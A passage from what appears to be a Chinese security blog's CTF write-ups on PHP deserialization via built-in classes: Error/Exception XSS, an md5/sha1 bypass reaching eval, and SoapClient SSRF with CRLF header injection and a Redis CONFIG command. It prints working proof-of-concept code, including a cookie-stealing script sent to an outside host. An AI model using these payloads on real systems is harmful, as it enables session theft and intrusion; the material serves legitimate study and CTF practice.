SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="call方法"><a href="#call方法" class="headerlink" title="__call方法"></a><span style="color: orange;">__call方法</span></h3><p>该类的<code>__call</code>方法被触发后，可以发送HTTP和HTTPS请求。其构造函数如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">SoapClient</span>::<span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [, arry <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure>

<ol>
<li>第一个参数用来指明是否是wsdl模式，将该值设置为null则表示非wsdl模式。</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri是SOAP服务的目标命名空间。</li>
</ol>
<h1 id="使用Error-Exception类进行XSS"><a href="#使用Error-Exception类进行XSS" class="headerlink" title="使用Error&#x2F;Exception类进行XSS"></a>使用Error&#x2F;Exception类进行XSS</h1><p>注意：</p>
<ul>
<li>要在开启报错的前提下。</li>
<li>Error只适用于php7，Exception适用于php 5或7</li>
</ul>
<p>通常在反序列化中，如果有个POP链走到一半就走不通了，不如尝试利用Error&#x2F;Exception类的__toString()方法来做一个xss。</p>
<h2 id="xss演示"><a href="#xss演示" class="headerlink" title="xss演示"></a>xss演示</h2><p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Ming&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>POC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Tong&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//输出:</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A30%3A%22%3Cscript%3Ealert%28%27Tong%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A69%3A%22D%3A%5Cweb_soft_home%5Cphpstudy_pro%5CWWW%5Ceclipse_workspace%5Cfirstpro%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>成功弹窗</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272236192.png" alt="image-20250123211130604"  />

<h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>先Git泄漏，得到如下内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>一个GET传参一个反序列化函数，可能是反序列化但是连一个类也不给，无法构造POP链啊，这时候就要想到利用php内置类来打了</p>
<p>不过这道题明说了是xss，有关xss的题flag一般都在Cookie中，所以可以直接<code>document.Cookie</code>运行，flag就出来了。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272236420.png" alt="image-20250123213358078"  />

<p>不过这种情况很少见，还是学一个正经点的方法：利用php内置类反序列化打xss</p>
<h3 id="xss的payload构造"><a href="#xss的payload构造" class="headerlink" title="xss的payload构造"></a><span style="color: orange;">xss的payload构造</span></h3><p><code>window.open()</code>打开新窗口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://ed527973-7ba3-455a-b532-de236f21b2a9.node5.buuoj.cn&#x27;</span></span><br><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="title function_">open</span>(url+<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>window.location.href</code>实现恶意跳转</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=url+<span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://ed527973-7ba3-455a-b532-de236f21b2a9.node5.buuoj.cn&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>然后直接访问下面的URL即可</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://ed527973-<span class="number">7</span>ba3-<span class="number">455</span>a-b532-de236f21b2a9.node5.buuoj.cn:<span class="number">81</span>/?yds_is_so_beautiful=O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>Error%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A109%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">27</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fed527973-<span class="number">7</span>ba3-<span class="number">455</span>a-b532-de236f21b2a9.node5.buuoj.cn%<span class="number">2</span>F%<span class="number">3</span>F%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Error%<span class="number">00</span>string%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A69%<span class="number">3</span>A%<span class="number">22</span>D%<span class="number">3</span>A%<span class="number">5</span>Cweb_soft_home%<span class="number">5</span>Cphpstudy_pro%<span class="number">5</span>CWWW%<span class="number">5</span>Ceclipse_workspace%<span class="number">5</span>Cfirstpro%<span class="number">5</span>Ctest.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Error%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Error%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<h1 id="使用Error-Exception类绕过哈希比较"><a href="#使用Error-Exception类绕过哈希比较" class="headerlink" title="使用Error&#x2F;Exception类绕过哈希比较"></a>使用Error&#x2F;Exception类绕过哈希比较</h1><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>已知Error和Exception类的<code>__toString</code>方法会将错误或异常对象转换为字符串，现在来将这个字符串输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hhh&quot;</span>,<span class="number">1</span>);  <span class="comment">//“hhh”是错误内容，第二个参数1是错误代码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error: </span>hhh in D:\web_soft_home\phpstudy_pro\WWW\eclipse_workspace\firstpro\test.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure>

<p>发现输出的字符串包含当前的错误信息内容、错误文件的绝对路径、错误所在行号，而我们设置的错误代码<code>code</code>并没有被输出。</p>
<p>看下一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hhh&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hhh&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>.<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error: </span>hhh in D:\web_soft_home\phpstudy_pro\WWW\eclipse_workspace\firstpro\test.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line"><span class="keyword">Error: </span>hhh in D:\web_soft_home\phpstudy_pro\WWW\eclipse_workspace\firstpro\test.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure>

<p>发现如果异常内容和所在行号一样，即使错误代码不一样，最后输出的报错字符串也是一样的。当然这两个错误对象本身是不一样的，只是通过<code>__toString</code>方法转换成的字符串是一样的。</p>
<p>Exception类与Error的使用和结果完全一样，只不过<code>Exception</code>类适用于PHP 5和7，而<code>Error</code>只适用于PHP 7。</p>
<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>绕过<code>md5()</code>和<code>sha1()</code>：</li>
</ol>
<p><strong><code>md5()</code>和<code>sha1()</code>可以对一个类进行<code>hash</code>并触发这个类的<code>__toString</code>方法，当<code>eval()</code>函数的参数是一个类对象时，也会触发这个类的<code>__toString()</code>方法。</strong></p>
<p>所以我们可以使用含有<code>__toString</code>方法的PHP内置类来绕过，用的两个比较多的内置类就是<code>Exception</code>和<code>Error</code>，他们之中有一个<code>__toString</code>方法，当类被当做字符串处理时，就会调用这个函数。</p>
<ol start="2">
<li>构造payload：</li>
</ol>
<p>过滤了小括号无法调用函数，这里利用<code>include &quot;/flag&quot;</code>将flag文件包含进来即可。由于又过滤了双引号，可以对<code>&quot;/flag&quot;</code>利用取反绕过，因为有不可见字符所以再<code>url</code>一下更好。</p>
<p>对于Error和Exception类的__toString方法将错误信息转换成字符串payload后，进入eval()函数会类似于：<code>eval(&quot;...Error: payload&quot;)</code>。所以我们要用<code>?&gt;</code>来闭合一下，即 <code>eval(&quot;...Error: ?&gt;&lt;?php payload ?&gt;&quot;)</code>，这样我们的payload便能顺利执行了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;syc=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">1</span>);<span class="variable">$a</span>-&gt;lover=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$payload</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235075.png" alt="image-20250123194029905"></p>
<h1 id="使用SoapClient类进行SSRF"><a href="#使用SoapClient类进行SSRF" class="headerlink" title="使用SoapClient类进行SSRF"></a>使用SoapClient类进行SSRF</h1><h2 id="漏洞利用演示"><a href="#漏洞利用演示" class="headerlink" title="漏洞利用演示"></a>漏洞利用演示</h2><p>构造SSRF利用的exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://192.168.130.7:2333/&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;Ming&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line"><span class="comment">#O:10:&quot;SoapClient&quot;:4:&#123;s:3:&quot;uri&quot;;s:4:&quot;Ming&quot;;s:8:&quot;location&quot;;s:26:&quot;http://192.168.130.7:2333/&quot;;s:15:&quot;_stream_context&quot;;i:0;s:13:&quot;_soap_version&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure>

<p>触发漏洞：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:10:&quot;SoapClient&quot;:4:&#123;s:3:&quot;uri&quot;;s:4:&quot;Ming&quot;;s:8:&quot;location&quot;;s:26:&quot;http://192.168.130.7:2333/&quot;;s:15:&quot;_stream_context&quot;;i:0;s:13:&quot;_soap_version&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">c</span>();   <span class="comment">#调用SoapClient中没有的方法，触发SoapClient类的__call</span></span><br></pre></td></tr></table></figure>

<p>在192.168.130.7上面监听，然后运行上面代码，成功触发SSRF，192.168.130.7上面收到了请求信息。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235464.png" alt="image-20250128013521279" style="zoom:50%;" />

<h2 id="结合CRLF注入利用"><a href="#结合CRLF注入利用" class="headerlink" title="结合CRLF注入利用"></a>结合CRLF注入利用</h2><p><strong>在User_Agent头部注入</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&quot;http://192.168.130.7:2333/&quot;</span>;</span><br><span class="line"><span class="variable">$agent</span> = <span class="string">&quot;OneBrowser\r\nCookie: PHPSESSID=5799&quot;</span>;</span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;Ming&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$location</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$agent</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="variable">$uri</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>)-&gt;<span class="title function_ invoke__">c</span>();</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235645.png" alt="image-20250128204822975"></p>
<p><strong>发送POST数据包</strong></p>
<p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，所以我们要发送 POST 数据就要插入两个CRLF。</p>
<p>对于如何发送POST的数据包，这里面还有一个坑，就是<code>Content-Type</code>的设置，因为我们要提交的是POST数据，所以Content-Type的值我们要设置为<code>application/x-www-form-urlencoded</code>，这里如何修改Content-Type的值呢？由于Content-Type在<code>User-Agent</code>的下面，所以我们可以通过<code>SoapClient</code>来设置User-Agent，将原来的Content-Type挤下去，从而再插入一个新的Content-Type。</p>
<p>exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$location</span> = <span class="string">&#x27;http://192.168.130.7:2333/&#x27;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$agent</span> = <span class="string">&#x27;WHOAMI^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>;</span><br><span class="line"><span class="variable">$user_agent</span> = <span class="variable">$agent</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$location</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$user_agent</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>)-&gt;<span class="title function_ invoke__">c</span>();</span><br></pre></td></tr></table></figure>

<p>查看监听到的数据，成功注入POST包：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235083.png" alt="image-20250128221510051"></p>
<h2 id="与Redis结合"><a href="#与Redis结合" class="headerlink" title="与Redis结合"></a>与Redis结合</h2><p>可以再结合通过HTTP协议去攻击Redis来利用，exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&#x27;http://192.168.130.7:2333/&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$location</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$payload</span>.<span class="string">&#x27;^^hello&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a href="https://xz.aliyun.com/news/8792#toc-0">https://xz.aliyun.com/news/8792#toc-0</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化字符逃逸</title>
    <url>/2025/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>php反序列化字符逃逸，其实就是利用过滤函数会使序列化字符串增长或缩短的特性，来构造新的序列化字符串进行攻击。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>序列化字符串在经过过滤函数不正确的处理而导致对象注入，主要原因是<strong>过滤函数放在了<code>serialize</code>函数之后</strong>。</p>
<span id="more"></span>

<h2 id="缩短逃逸"><a href="#缩短逃逸" class="headerlink" title="缩短逃逸"></a>缩短逃逸</h2><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_44632787/article/details/119185112">BUUCTF之[安洵杯 2019]easy_serialize_php</a></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];  <span class="comment">#从$_GET超全局数组中获取一个名为 f 的键的对应值，使用错误控制运算符 @ 来抑制可能发生的任何错误。GET传参f的值</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);   <span class="comment">#数组的键成为新变量的名称，而数组的值成为这些变量的值。</span></span><br><span class="line"><span class="comment">#_SESSION[phpflag] = ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;   </span><br><span class="line"><span class="comment">#$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ 